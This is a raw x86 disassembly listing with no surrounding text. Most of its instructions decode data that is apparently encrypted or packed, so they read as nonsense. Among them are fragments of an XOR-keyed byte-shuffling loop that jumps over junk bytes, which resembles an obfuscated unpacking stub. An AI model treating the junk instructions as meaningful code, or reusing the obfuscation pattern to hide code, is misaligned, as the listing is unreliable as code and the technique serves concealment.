  40604c:	inc    ecx
  40604d:	ret    
  40604e:	add    ebp,edx
  406050:	call   0xda72:0x1ee4c1a3
  406057:	js     0x405ffa
  406059:	sub    DWORD PTR [eax],eax
  40605b:	ins    BYTE PTR es:[edi],dx
  40605c:	cmp    al,0x8c
  40605e:	push   0x78
  406060:	shl    BYTE PTR [edi+0x55af3884],cl
  406066:	nop
  406067:	dec    edx
  406068:	and    BYTE PTR [edi+eiz*2-0x66f1f574],dh
  40606f:	fdivr  st,st(0)
  406071:	mov    eax,ds:0xda3bbbdb
  406076:	mov    edx,DWORD PTR [ebp-0x38]
  406079:	jmp    0x4063d3
  40607e:	test   eax,0x68f06eef
  406083:	jno    0x406036
  406085:	ja     0x406061
  406087:	shr    BYTE PTR [edx+0x79],0xde
  40608b:	fmul   QWORD PTR [ecx+0x7e3de051]
  406091:	jle    0x4060c6
  406093:	jge    0x406113
  406095:	jle    0x4060d9
  406097:	mov    dh,0x9c
  406099:	je     0x406046
  40609b:	mov    fs,WORD PTR [ecx+ebx*8+0x6a]
  40609f:	in     al,0xbb
  4060a1:	outs   dx,BYTE PTR ds:[esi]
  4060a2:	sub    ah,ah
  4060a4:	add    DWORD PTR [ebp+0x7b],ebp
  4060a7:	jb     0x406113
  4060a9:	sub    BYTE PTR [eax-0x7],bh
  4060ac:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4060ad:	inc    edx
  4060ae:	jne    0x406092
  4060b0:	pop    ebp
  4060b1:	or     ah,BYTE PTR [ebp-0x37]
  4060b4:	push   ds
  4060b5:	retf   0x4bb7
  4060b8:	je     0x40606b
  4060ba:	jno    0x4060aa
  4060bc:	cli    
  4060bd:	jae    0x40606b
  4060bf:	sahf   
  4060c0:	push   0xffffff8c
  4060c2:	jge    0x406127
  4060c4:	shr    BYTE PTR [esi+0x5b5bcd5],0x7f
  4060cb:	enter  0xa87e,0x51
  4060cf:	push   ebx
  4060d0:	xchg   edx,eax
  4060d1:	jo     0x40612d
  4060d3:	xor    dh,BYTE PTR [eax+0x1f]
  4060d6:	mov    al,0xd9
  4060d8:	adc    ecx,DWORD PTR [ebx-0x33]
  4060db:	add    al,0xe8
  4060dd:	imul   edi,DWORD PTR [edi],0xbbd18ca4
  4060e3:	adc    cl,BYTE PTR [ecx+0x1d2d4de0]
  4060e9:	mov    ecx,0xa2cc341b
  4060ee:	mov    dh,0x8d
  4060f0:	sub    al,dl
  4060f2:	xchg   ebp,eax
  4060f3:	test   DWORD PTR [eax],0x3c33d243
  4060f9:	loopne 0x406124
  4060fb:	lahf   
  4060fc:	dec    eax
  4060fd:	es ss inc edi
  406100:	mov    esp,0x1e66be8c
  406105:	mov    WORD PTR [esi],?
  406107:	test   eax,0xbb067653
  40610c:	jle    0x40610f
  40610e:	cmp    BYTE PTR [ecx-0x3c],ah
  406111:	stos   DWORD PTR es:[edi],eax
  406112:	cld    
  406113:	frstor [esp+eax*2-0x2797093d]
  40611a:	dec    ebp
  40611b:	xor    al,dl
  40611d:	cmp    DWORD PTR ds:0xae47c8a2,edx
  406123:	cmp    al,0xf3
  406125:	fcmovb st,st(7)
  406127:	clc    
  406128:	add    ah,dl
  40612a:	out    dx,al
  40612b:	icebp  
  40612c:	cmp    bh,bl
  40612e:	outs   dx,DWORD PTR ds:[esi]
  40612f:	pop    ebp
  406130:	fwait
  406131:	sbb    ch,BYTE PTR [ecx+edi*8+0x370d4ab2]
  406138:	int3   
  406139:	inc    ebp
  40613a:	pop    ebx
  40613b:	pusha  
  40613c:	mov    ebx,0xf4e96e6a
  406141:	and    cl,BYTE PTR [eax-0x762ccf66]
  406147:	jo     0x406199
  406149:	push   ebx
  40614a:	jb     0x406162
  40614c:	sbb    al,0xb1
  40614e:	mov    ah,BYTE PTR [ebx]
  406150:	(bad)  
  406151:	lock xchg ebx,eax
  406153:	inc    esi
  406154:	pusha  
  406155:	sub    eax,0x9c8889b4
  40615a:	stc    
  40615b:	xor    esi,0x35b159
  406161:	cld    
  406162:	stos   DWORD PTR es:[edi],eax
  406163:	push   ebp
  406164:	scas   al,BYTE PTR es:[edi]
  406165:	sub    eax,0xb9477b5f
  40616a:	pusha  
  40616b:	jno    0x4061c3
  40616d:	pop    ebx
  40616e:	lsl    esi,di
  406171:	mov    esi,0x8541fa56
  406176:	call   0x38f0:0x3080e671
  40617d:	ins    DWORD PTR es:[edi],dx
  40617e:	test   DWORD PTR [edx-0x3e0b764b],ebx
  406184:	sub    al,0xc8
  406186:	daa    
  406187:	cmp    eax,0x7eddc979
  40618c:	jp     0x406204
  40618e:	mov    ecx,0x3806baf9
  406193:	sbb    eax,0x73aa344f
  406198:	bound  ebp,QWORD PTR [ecx]
  40619a:	dec    ecx
  40619b:	push   edi
  40619c:	sahf   
  40619d:	clc    
  40619e:	mov    ebp,0x25afd6df
  4061a3:	xchg   esp,eax
  4061a4:	adc    eax,0x3ac5a901
  4061a9:	dec    edi
  4061aa:	cmp    DWORD PTR [ebx],ebp
  4061ac:	daa    
  4061ad:	rcl    DWORD PTR [esi],cl
  4061af:	jl     0x40616b
  4061b1:	in     al,dx
  4061b2:	adc    BYTE PTR [ecx],0xc2
  4061b5:	out    0x10,eax
  4061b7:	rcl    ah,0x7d
  4061ba:	push   ds
  4061bb:	arpl   sp,si
  4061bd:	(bad)  
  4061be:	repz aam 0xc1
  4061c1:	and    al,0x54
  4061c3:	xor    eax,0x1dbb5876
  4061c8:	stos   BYTE PTR es:[edi],al
  4061c9:	mov    gs,WORD PTR [ebp-0x1]
  4061cc:	shl    bl,0x8a
  4061cf:	and    DWORD PTR [ebx-0x70],ebp
  4061d2:	mov    ebp,0x36273319
  4061d7:	mov    dl,0xf8
  4061d9:	fprem  
  4061db:	inc    esp
  4061dc:	outs   dx,BYTE PTR ds:[esi]
  4061dd:	cmp    eax,DWORD PTR [edi+0x4029292a]
  4061e3:	fstp   TBYTE PTR [eax+eiz*1+0x22d097df]
  4061ea:	jne    0x40623d
  4061ec:	or     ebp,eax
  4061ee:	xor    BYTE PTR [edx],bl
  4061f0:	ss ds pop eax
  4061f3:	cmp    BYTE PTR [esi+0xf51a930],dh
  4061f9:	int3   
  4061fa:	mov    ds:0x174da639,al
  4061ff:	xor    BYTE PTR [edx-0x48],dh
  406202:	aam    0x3e
  406204:	(bad)  
  406206:	out    dx,al
  406207:	into   
  406208:	jnp    0x4061b8
  40620a:	inc    ebx
  40620b:	lock icebp 
  40620d:	lea    ebx,[edx]
  40620f:	fcom   QWORD PTR [si+0x3]
  406213:	sbb    ebx,DWORD PTR [ebx]
  406215:	pop    ecx
  406216:	mov    al,0x82
  406218:	imul   edi,DWORD PTR [edx],0x3813eef4
  40621e:	pop    edi
  40621f:	lock ret 
  406221:	or     DWORD PTR [edi+0x4efdfd94],ecx
  406227:	push   esi
  406228:	in     al,dx
  406229:	ror    dh,1
  40622b:	lods   eax,DWORD PTR ds:[esi]
  40622c:	les    esp,FWORD PTR [esi-0x484226d8]
  406232:	adc    DWORD PTR [eax],esp
  406234:	inc    ebp
  406235:	lods   al,BYTE PTR ds:[esi]
  406236:	std    
  406237:	out    0xc3,al
  406239:	not    edx
  40623b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40623c:	mov    edx,0x9f443a40
  406241:	call   0x33f064f1
  406246:	xchg   ch,cl
  406248:	mov    ecx,0x61ca0f77
  40624d:	adc    eax,0xb9fa8b38
  406252:	push   esi
  406253:	xor    eax,0x9f4c8ad9
  406258:	mov    ds:0x5dce37,al
  40625d:	add    al,0xb1
  40625f:	add    eax,0xdab7e9cb
  406264:	pop    esi
  406265:	xchg   esi,eax
  406266:	dec    eax
  406267:	pop    ebp
  406268:	not    BYTE PTR [edx]
  40626a:	retf   
  40626b:	mov    ds:0x1750293a,al
  406270:	js     0x4062af
  406272:	ds adc eax,0x40430e96
  406278:	in     al,0xb8
  40627a:	cs jg  0x4062d8
  40627d:	inc    esi
  40627e:	ja     0x4062f9
  406280:	adc    eax,0xca6801aa
  406285:	jns    0x406247
  406287:	add    BYTE PTR [esi+0x3f],cl
  40628a:	dec    eax
  40628b:	popa   
  40628c:	cdq    
  40628d:	jp     0x40627a
  40628f:	repz inc ebx
  406291:	jl     0x406295
  406293:	sbb    ah,BYTE PTR cs:[ebx]
  406296:	or     eax,0x604bf1cf
  40629b:	jno    0x406236
  40629d:	inc    esp
  40629e:	adc    DWORD PTR [esi+0x50f4ecc8],eax
  4062a4:	sub    DWORD PTR [ebx],esp
  4062a6:	cmp    al,0xab
  4062a8:	mov    ds:0xe6bb665c,al
  4062ad:	outs   dx,DWORD PTR ds:[esi]
  4062ae:	stc    
  4062af:	xchg   edi,eax
  4062b0:	push   eax
  4062b1:	add    BYTE PTR ds:0x7941fc33,al
  4062b7:	ja     0x406258
  4062b9:	aas    
  4062ba:	adc    al,0xa1
  4062bc:	mov    esi,0xe0959c7b
  4062c1:	(bad)  
  4062c2:	cmc    
  4062c3:	daa    
  4062c4:	sub    ch,BYTE PTR [ecx-0x14]
  4062c7:	jnp    0x406314
  4062c9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4062ca:	ins    DWORD PTR es:[edi],dx
  4062cb:	fbstp  TBYTE PTR [edx-0x630c03e8]
  4062d1:	dec    edi
  4062d2:	jno    0x406308
  4062d4:	xor    al,0x2b
  4062d6:	enter  0x3c4,0x44
  4062da:	and    ah,BYTE PTR [edx]
  4062dc:	xchg   ecx,eax
  4062dd:	in     eax,0x36
  4062df:	dec    edx
  4062e0:	xchg   edx,eax
  4062e1:	inc    ecx
  4062e2:	shl    BYTE PTR [edi+esi*1-0x74d58689],0x60
  4062ea:	out    0x9b,eax
  4062ec:	add    BYTE PTR [esi],al
  4062ee:	ds xchg esi,eax
  4062f0:	add    eax,DWORD PTR [edi]
  4062f2:	jns    0x406351
  4062f4:	mov    ds,WORD PTR [edx-0x4217efa8]
  4062fa:	sbb    eax,eax
  4062fc:	rcr    DWORD PTR [ecx+0x6a70249],cl
  406302:	bound  eax,QWORD PTR ds:0xe3501017
  406308:	out    0x41,al
  40630a:	mov    BYTE PTR [eax],al
  40630c:	(bad)  
  40630e:	mov    al,ds:0x8e312b53
  406313:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406314:	xchg   edi,eax
  406315:	mov    BYTE PTR [edx+0x65],bh
  406318:	ret    0x17e
  40631b:	ret    
  40631c:	pop    edx
  40631d:	push   ebx
  40631e:	jmp    0x4cfaeaac
  406323:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406324:	sub    al,0x93
  406326:	mov    ah,bh
  406328:	rcr    DWORD PTR [edi+edi*1+0x44],1
  40632c:	cmc    
  40632d:	rol    BYTE PTR ds:0xc5198b35,cl
  406333:	(bad)  
  406334:	in     al,0xb0
  406336:	jne    0x40639b
  406338:	dec    ebp
  406339:	mov    eax,ds:0xef2b32a6
  40633e:	pop    esp
  40633f:	ja     0x4062ce
  406341:	adc    DWORD PTR [edx+0x595fa0e0],esi
  406347:	xor    DWORD PTR [esi],edx
  406349:	xlat   BYTE PTR ds:[ebx]
  40634a:	popf   
  40634b:	mov    al,0xb5
  40634d:	cs shr ah,cl
  406350:	mov    bh,0x5f
  406352:	into   
  406353:	scas   al,BYTE PTR es:[edi]
  406354:	mov    dh,0x10
  406356:	xlat   BYTE PTR ds:[ebx]
  406357:	jo     0x406305
  406359:	dec    ebp
  40635a:	sub    al,0xb
  40635c:	jge    0x406335
  40635e:	repz cmp DWORD PTR [ecx+eax*4],esi
  406362:	js     0x406328
  406364:	dec    esp
  406365:	mov    dl,0x67
  406367:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406368:	jae    0x4063d0
  40636a:	dec    ebp
  40636b:	daa    
  40636c:	es dec ecx
  40636e:	inc    edx
  40636f:	out    0x9a,al
  406371:	xchg   esi,eax
  406372:	adc    ebp,DWORD PTR [ecx+eiz*1-0x3bc15e7a]
  406379:	pop    ecx
  40637a:	pop    ecx
  40637b:	push   cs
  40637c:	fisubr DWORD PTR [eax+edi*1-0x5f]
  406380:	sbb    eax,DWORD PTR [ebp+0x8]
  406383:	push   es
  406384:	imul   esi,DWORD PTR [ebp-0x1fb2495c],0x17b03265
  40638e:	popf   
  40638f:	or     esp,esp
  406391:	push   esi
  406392:	xor    DWORD PTR [edi+edx*8+0x61],ebp
  406396:	dec    ebp
  406397:	push   ebx
  406398:	sub    ebx,edx
  40639a:	arpl   WORD PTR [edx+ecx*1+0x3f],sp
  40639e:	xor    al,0xb5
  4063a0:	ins    BYTE PTR es:[edi],dx
  4063a1:	pop    edx
  4063a2:	adc    BYTE PTR [ecx-0x26],dh
  4063a5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4063a6:	xor    DWORD PTR [ebx+0x118e7813],esp
  4063ac:	(bad)  
  4063ad:	in     eax,dx
  4063ae:	out    0x83,al
  4063b0:	add    BYTE PTR [edx+0x38c2a704],bl
  4063b6:	mov    al,0xba
  4063b8:	stc    
  4063b9:	push   ds
  4063ba:	or     BYTE PTR [edi+eax*4],cl
  4063bd:	pop    es
  4063be:	mov    bl,0xfa
  4063c0:	pop    ebp
  4063c1:	test   al,0x4a
  4063c3:	fild   QWORD PTR [edx-0x5eea1f43]
  4063c9:	sub    al,0xf0
  4063cb:	push   ebx
  4063cc:	jle    0x406438
  4063ce:	aam    0x1b
  4063d0:	xchg   ebp,eax
  4063d1:	loopne 0x406429
  4063d3:	jbe    0x4063dc
  4063d9:	mov    edx,DWORD PTR [ebp-0x3c]
  4063dc:	mov    edi,DWORD PTR [ebp-0x4]
  4063df:	xor    edi,eax
  4063e1:	xor    edx,eax
  4063e3:	add    edi,ecx
  4063e5:	add    edx,ecx
  4063e7:	imul   edx,edi
  4063ea:	mov    DWORD PTR [ebp+0xc],edx
  4063ed:	mov    edx,DWORD PTR [ebp+0xc]
  4063f0:	mov    DWORD PTR [ebp-0x24],edx
  4063f3:	mov    edx,DWORD PTR [ebp-0x8]
  4063f6:	add    edx,DWORD PTR [ebp-0x40]
  4063f9:	mov    DWORD PTR [ebp-0x18],0xf89c8531
  406400:	mov    DWORD PTR [ebp-0x1c],edx
  406403:	mov    DWORD PTR [ebp-0xc],0xf89c8532
  40640a:	mov    DWORD PTR [ebp-0x44],0xf89c8533
  406411:	mov    edx,DWORD PTR [ebp-0x18]
  406414:	xor    edx,eax
  406416:	add    edx,ecx
  406418:	jmp    0x4067df
  40641d:	mov    edx,DWORD PTR [ebp-0x18]
  406420:	xor    edx,eax
  406422:	add    edx,DWORD PTR [ebp-0x14]
  406425:	mov    edi,DWORD PTR [ebp-0x1c]
  406428:	mov    dl,BYTE PTR [edx+edi*1+0x32729b]
  40642f:	mov    BYTE PTR [ebp+0xf],dl
  406432:	mov    edx,DWORD PTR [ebp-0xc]
  406435:	xor    edx,eax
  406437:	add    edx,DWORD PTR [ebp-0x14]
  40643a:	mov    edi,DWORD PTR [ebp-0x1c]
  40643d:	mov    dl,BYTE PTR [edx+edi*1+0x32729b]
  406444:	mov    BYTE PTR [ebp+0xb],dl
  406447:	mov    dl,BYTE PTR [ebp+0xf]
  40644a:	mov    edi,DWORD PTR [ebp-0xc]
  40644d:	jmp    0x4067a7
  406452:	pop    esi
  406453:	xlat   BYTE PTR ds:[ebx]
  406454:	pop    edi
  406455:	jmp    0x4064ce
  406457:	jae    0x4064c3
  406459:	push   ebx
  40645a:	jmp    0x4064aa
  40645c:	cmc    
  40645d:	pop    ss
  40645e:	inc    eax
  40645f:	jnp    0x406487
  406461:	mov    edx,0x7e7e38a5
  406466:	xor    edi,DWORD PTR [ebp+0x7e]
  406469:	jle    0x40647f
  40646b:	mov    edi,0x10ec1880
  406470:	int    0xec
  406472:	jb     0x406418
  406474:	inc    edx
  406475:	out    dx,al
  406476:	mov    cl,0x22
  406478:	mul    BYTE PTR [ebp-0x1b781d92]
  40647e:	cmp    al,0xb
  406480:	push   es
  406481:	jnp    0x4064d5
  406483:	jne    0x406428
  406485:	retf   0x7a06
  406488:	pop    ebx
  406489:	dec    edi
  40648a:	fist   WORD PTR ds:0x27943ba
  406490:	pop    esp
  406491:	mul    DWORD PTR ds:0xec86eff5
  406497:	pop    edi
  406498:	mov    dh,0xec
  40649a:	or     BYTE PTR [edi-0xd],al
  40649d:	push   edx
  40649e:	mov    al,BYTE PTR [esi]
  4064a0:	add    al,0x9f
  4064a2:	out    dx,al
  4064a3:	xchg   BYTE PTR [esi+0x7bced358],bl
  4064a9:	xchg   edx,eax
  4064aa:	or     edx,esi
  4064ac:	mov    ecx,0xa04794de
  4064b1:	inc    ecx
  4064b2:	cld    
  4064b3:	(bad)  
  4064b4:	fnstenv [eax]
  4064b6:	adc    bh,0xda
  4064b9:	mov    ecx,0xe1db508c
  4064be:	xchg   edi,eax
  4064bf:	(bad)  
  4064c0:	daa    
  4064c1:	inc    BYTE PTR [ecx-0x9]
  4064c4:	in     eax,dx
  4064c5:	dec    esp
  4064c6:	hlt    
  4064c7:	push   edx
  4064c8:	cmp    edi,DWORD PTR [edi-0x2979601c]
  4064ce:	lahf   
  4064cf:	cmp    bl,BYTE PTR [ebp-0x76b3506b]
  4064d5:	xor    BYTE PTR [esp+esi*8+0x2f],dl
  4064d9:	mov    dh,0x8d
  4064db:	rcr    BYTE PTR [edi+0x75],0x2d
  4064df:	mov    eax,0x944fb7c8
  4064e4:	jmp    0xc0d5:0x622cf9bd
  4064eb:	sbb    DWORD PTR [ebx],esp
  4064ed:	mov    edx,0xf8914a92
  4064f2:	inc    dx
  4064f4:	xor    ecx,DWORD PTR [ebp-0x23e441bb]
  4064fa:	or     DWORD PTR [eax+ebx*8],0x9749c60b
  406501:	cmp    esi,eax
  406503:	lahf   
  406504:	fldenv [ebp+ecx*8+0x2eea65d1]
  40650b:	sbb    DWORD PTR [ebx-0x7c],edx
  40650e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40650f:	fst    QWORD PTR [edx+0x1a]
  406512:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406513:	stc    
  406514:	cld    
  406515:	push   cs
  406516:	lahf   
  406517:	sar    BYTE PTR [ebp+0x41f003cd],cl
  40651d:	imul   eax,DWORD PTR ds:0xd335eb2,0xffffffe7
  406524:	shl    DWORD PTR [eax-0x2440b55a],cl
  40652a:	jne    0x40654b
  40652c:	cld    
  40652d:	sub    eax,0x9c8a6567
  406532:	neg    ebp
  406534:	pop    esp
  406535:	jns    0x4064cf
  406537:	push   edi
  406538:	rcl    BYTE PTR [ebp+0x65],1
  40653b:	arpl   dx,bp
  40653d:	call   0x51a3:0x59e27d6a
  406544:	test   eax,0xb5f80ef1
  406549:	mov    cl,0xb2
  40654b:	lds    esp,FWORD PTR [ebx-0x7c]
  40654e:	js     0x40656f
  406550:	cmp    ebx,0x61
  406553:	xchg   esp,eax
  406554:	xchg   ebp,eax
  406555:	mov    ah,0xe1
  406557:	lds    ecx,FWORD PTR [edx]
  406559:	aaa    
  40655a:	push   ds
  40655b:	fist   WORD PTR [esi+esi*2+0x6d]
  40655f:	mov    ebp,0x22d73b52
  406564:	and    al,0x3d
  406566:	dec    esp
  406567:	shr    eax,0x2
  40656a:	je     0x406552
  40656c:	js     0x4065e8
  40656e:	pusha  
  40656f:	loopne 0x406595
  406571:	lahf   
  406572:	sbb    al,0xf
  406574:	das    
  406575:	aam    0x36
  406577:	jp     0x406527
  406579:	jnp    0x4064fc
  40657b:	rcr    ch,cl
  40657d:	mov    ch,cl
  40657f:	xor    eax,0xa2251956
  406584:	mov    bh,0x12
  406586:	outs   dx,BYTE PTR ds:[esi]
  406587:	sub    dl,BYTE PTR [ebx-0x5a]
  40658a:	xchg   ebx,eax
  40658b:	mov    bl,0x1f
  40658d:	or     al,0x2f
  40658f:	inc    esp
  406590:	mov    dh,ah
  406592:	sub    ah,BYTE PTR [ecx+edx*8]
  406595:	inc    ecx
  406596:	popf   
  406597:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406598:	push   esi
  406599:	cwde   
  40659a:	in     al,0xd1
  40659c:	mov    eax,ds:0xc917757d
  4065a1:	in     al,0xec
  4065a3:	push   ecx
  4065a4:	rcr    BYTE PTR [esi-0x60dbd9c7],0xe1
  4065ab:	cmc    
  4065ac:	pop    eax
  4065ad:	(bad)  
  4065af:	inc    ecx
  4065b0:	cmp    eax,0xa7e8a4b2
  4065b5:	push   cs
  4065b6:	xor    edi,DWORD PTR [ebp+0x20282eac]
  4065bc:	mov    bh,0x7d
  4065be:	or     cl,ah
  4065c0:	dec    ebx
  4065c1:	aas    
  4065c2:	sub    eax,0x6ec9d8c9
  4065c7:	jne    0x4065c4
  4065c9:	adc    al,0xfe
  4065cb:	imul   ebp,DWORD PTR [ecx*1+0x785f53ee],0x66
  4065d3:	mov    ds:0x82a07b54,al
  4065d8:	add    bh,BYTE PTR ds:0xef536ba8
  4065de:	and    DWORD PTR [ecx+0xdd25cc7],edi
  4065e4:	and    eax,0x615bb37
  4065e9:	pop    es
  4065ea:	jl     0x4065a3
  4065ec:	and    DWORD PTR [esi],ebp
  4065ee:	push   eax
  4065ef:	rcr    DWORD PTR [eax+edi*4],cl
  4065f2:	mov    DWORD PTR ds:0xa3f587db,esp
  4065f8:	jge    0x4065a1
  4065fa:	imul   edi,edx,0x215a0838
  406600:	jp     0x4065fd
  406602:	pop    esi
  406603:	imul   edx,DWORD PTR [ecx],0x18
  406606:	rol    DWORD PTR [ebx-0x301c17cd],cl
  40660c:	cmc    
  40660d:	adc    eax,0x5a660537
  406612:	pop    ebp
  406613:	mov    bl,ch
  406615:	test   eax,0x910ba66d
  40661a:	repz xlat BYTE PTR ds:[ebx]
  40661c:	lods   eax,DWORD PTR ds:[esi]
  40661d:	std    
  40661e:	pop    ss
  40661f:	lock and eax,0x61c71a81
  406625:	dec    ecx
  406626:	dec    ebx
  406627:	loop   0x406691
  406629:	mov    al,ds:0x6349f816
  40662e:	mov    eax,ds:0x2e6c16d8
  406633:	or     DWORD PTR [esi-0x70e391c],esi
  406639:	sub    al,0x98
  40663b:	cmp    ebp,DWORD PTR [edx]
  40663d:	mov    esi,0x4c779d46
  406642:	loop   0x4065e1
  406644:	out    0x81,al
  406646:	jp     0x4066b8
  406648:	push   esp
  406649:	retf   0x3db1
  40664c:	rcr    DWORD PTR ds:0xf6666c7f,1
  406652:	xchg   ecx,eax
  406653:	sub    al,0x48
  406655:	pop    DWORD PTR [edx+ebx*1-0x674db725]
  40665c:	inc    ebp
  40665d:	scas   eax,DWORD PTR es:[edi]
  40665e:	inc    ecx
  40665f:	mov    BYTE PTR [eax+ebp*4-0x2b],cl
  406663:	or     al,0xb7
  406665:	xchg   ecx,eax
  406666:	popf   
  406667:	loopne 0x40665b
  406669:	imul   ecx,DWORD PTR [esi+0x2433434a],0x6e
  406670:	fcomp  QWORD PTR [ebp+0xf]
  406673:	fs leave 
  406675:	add    BYTE PTR [ebx],0xd4
  406678:	mov    ebx,0x3f26e894
  40667d:	sub    DWORD PTR [edx-0x54],edx
  406680:	push   ss
  406681:	adc    al,0x3e
  406683:	jp     0x406622
  406685:	adc    BYTE PTR [esi],dh
  406687:	adc    dl,bh
  406689:	jns    0x4066d7
  40668b:	sti    
  40668c:	or     esp,DWORD PTR [ecx-0x5928eaed]
  406692:	pop    ebp
  406693:	adc    bl,0xd2
  406696:	repz pop esp
  406698:	or     al,0xf0
  40669a:	out    dx,eax
  40669b:	inc    esi
  40669c:	shl    al,cl
  40669e:	or     ebx,DWORD PTR [esp+esi*4+0x4d9d9441]
  4066a5:	jl     0x406725
  4066a7:	repnz scas eax,DWORD PTR es:[edi]
  4066a9:	inc    edi
  4066aa:	and    eax,0x6a486f23
  4066af:	enter  0xce38,0x6b
  4066b3:	jmp    0xe7d:0x27404944
  4066ba:	push   0x3a
  4066bc:	and    ch,bl
  4066be:	push   edi
  4066bf:	dec    edi
  4066c0:	out    dx,al
  4066c1:	xchg   ebp,eax
  4066c2:	(bad)  
  4066c3:	fisttp QWORD PTR [edx+0x7b]
  4066c6:	imul   esp,DWORD PTR [edi-0x35],0xffffffec
  4066ca:	pop    ss
  4066cb:	mov    ebx,DWORD PTR [eax+ebp*8+0x6d]
  4066cf:	fyl2x  
  4066d1:	ja     0x4066ba
  4066d3:	cmp    eax,DWORD PTR [bx+si]
  4066d6:	(bad)  [ebx]
  4066d8:	loopne 0x4066fb
  4066da:	adc    BYTE PTR [edi-0x43ddddc3],al
  4066e0:	add    DWORD PTR [ecx-0x67],eax
  4066e3:	rep stos BYTE PTR es:[edi],al
  4066e5:	repz fisubr DWORD PTR [eax]
  4066e8:	jns    0x4066f9
  4066ea:	cdq    
  4066eb:	addr16 adc ah,dh
  4066ee:	in     eax,0xa2
  4066f0:	fld    QWORD PTR [edi-0x55]
  4066f3:	xchg   edx,eax
  4066f4:	or     DWORD PTR [ebx-0x78d28e15],ebp
  4066fa:	jmp    0x406779
  4066fc:	shl    DWORD PTR [eax+0x10100dc7],0xa3
  406703:	int3   
  406704:	dec    eax
  406705:	fisub  WORD PTR [edx+edx*4+0x41]
  406709:	popa   
  40670a:	xchg   ecx,eax
  40670b:	(bad)  
  40670c:	int    0x5f
  40670e:	scas   eax,DWORD PTR es:[edi]
  40670f:	xor    eax,0xda9e5626
  406714:	sub    al,0x26
  406716:	sub    al,ch
  406718:	pop    edx
  406719:	dec    esp
  40671a:	in     al,dx
  40671b:	sbb    dl,ah
  40671d:	cmp    DWORD PTR [ebp+0x45278a8a],ecx
  406723:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406724:	iret   
  406725:	xchg   ebp,eax
  406726:	mov    ds:0x7ebc073a,eax
  40672b:	mov    dh,0x81
  40672d:	ds loope 0x40678f
  406730:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406731:	dec    edx
  406732:	push   0x28
  406734:	je     0x406749
  406736:	adc    eax,0x548eef64
  40673b:	xchg   esp,eax
  40673c:	sub    ah,BYTE PTR [edi-0x66]
  40673f:	push   eax
  406740:	cmp    eax,0x192461ee
  406745:	and    eax,0xa778eb10
  40674a:	dec    edi
  40674b:	pop    ds
  40674c:	dec    esi
  40674d:	push   cs
  40674e:	(bad)  
  40674f:	fldcw  WORD PTR [ebp-0x2d01a6bd]
  406755:	arpl   WORD PTR [esi],cx
  406757:	push   cs
  406758:	push   0xfffffff2
  40675a:	(bad)  
  40675b:	fimul  DWORD PTR [ecx]
  40675d:	pop    esp
  40675e:	dec    edi
  40675f:	dec    edx
  406760:	mov    eax,DWORD PTR [esi-0x5aec5a64]
  406766:	cmp    al,BYTE PTR [edx+ebp*8+0x7e66e2bf]
  40676d:	inc    ebp
  40676e:	xor    eax,0x75a6e1a0
  406773:	das    
  406774:	not    dh
  406776:	mov    cl,BYTE PTR [ebp-0x224e9fe8]
  40677c:	popa   
  40677d:	popa   
  40677e:	dec    edi
  40677f:	xchg   esp,eax
  406780:	pop    ebp
  406781:	mov    esp,0x2d9ea567
  406786:	mov    dl,0xe5
  406788:	cmp    DWORD PTR ds:0x9fc4f036,ecx
  40678e:	mov    ch,0xc2
  406790:	lds    ebp,FWORD PTR [ecx]
  406792:	shl    esi,0x92
  406795:	mov    ds:0x741366ac,al
  40679a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40679b:	pop    esi
  40679c:	test   BYTE PTR [edi-0x1e],dh
  40679f:	test   DWORD PTR [esi+eax*2-0x2f],edx
  4067a3:	js     0x406807
  4067a5:	(bad)  
  4067a6:	out    dx,eax
  4067a7:	xor    edi,eax
  4067a9:	add    edi,DWORD PTR [ebp-0x14]
  4067ac:	mov    ebx,DWORD PTR [ebp-0x1c]
  4067af:	mov    BYTE PTR [edi+ebx*1+0x32729b],dl
  4067b6:	mov    dl,BYTE PTR [ebp+0xb]
  4067b9:	mov    edi,DWORD PTR [ebp-0x18]
  4067bc:	xor    edi,eax
  4067be:	add    edi,DWORD PTR [ebp-0x14]
  4067c1:	mov    ebx,DWORD PTR [ebp-0x1c]
  4067c4:	mov    BYTE PTR [edi+ebx*1+0x32729b],dl
  4067cb:	mov    edx,DWORD PTR [ebp-0x44]
  4067ce:	mov    edi,DWORD PTR [ebp-0xc]
  4067d1:	xor    edx,eax
  4067d3:	xor    edi,eax
  4067d5:	add    edx,ecx
  4067d7:	add    edi,ecx
  4067d9:	imul   edx,edi
  4067dc:	add    edx,DWORD PTR [ebp-0x14]
  4067df:	mov    DWORD PTR [ebp-0x14],edx
  4067e2:	mov    edx,DWORD PTR [ebp-0xc]
  4067e5:	mov    edi,DWORD PTR [ebp-0x24]
  4067e8:	xor    edx,eax
  4067ea:	add    edx,ecx
  4067ec:	imul   edx,edi
  4067ef:	mov    edi,DWORD PTR [ebp-0xc]
  4067f2:	xor    edi,eax
  4067f4:	sub    edx,edi
  4067f6:	mov    edi,DWORD PTR [ebp-0xc]
  4067f9:	mov    ebx,DWORD PTR [ebp-0x14]
  4067fc:	xor    edi,eax
  4067fe:	add    edi,ecx
  406800:	imul   edi,ebx
  406803:	mov    ebx,DWORD PTR [ebp-0x18]
  406806:	xor    ebx,eax
  406808:	sub    edx,ecx
  40680a:	lea    edi,[edi+ebx*1+0x32729b]
  406811:	cmp    edi,edx
  406813:	jbe    0x40641d
  406819:	mov    edx,DWORD PTR [ebp-0xc]
  40681c:	mov    edi,DWORD PTR [ebp-0x24]
  40681f:	xor    edx,eax
  406821:	add    edx,ecx
  406823:	imul   edx,edi
  406826:	mov    edi,DWORD PTR [ebp-0x18]
  406829:	xor    edi,eax
  40682b:	add    edx,edi
  40682d:	mov    edi,DWORD PTR [ebp-0x8]
  406830:	lea    edx,[edx+edi*1+0x32729b]
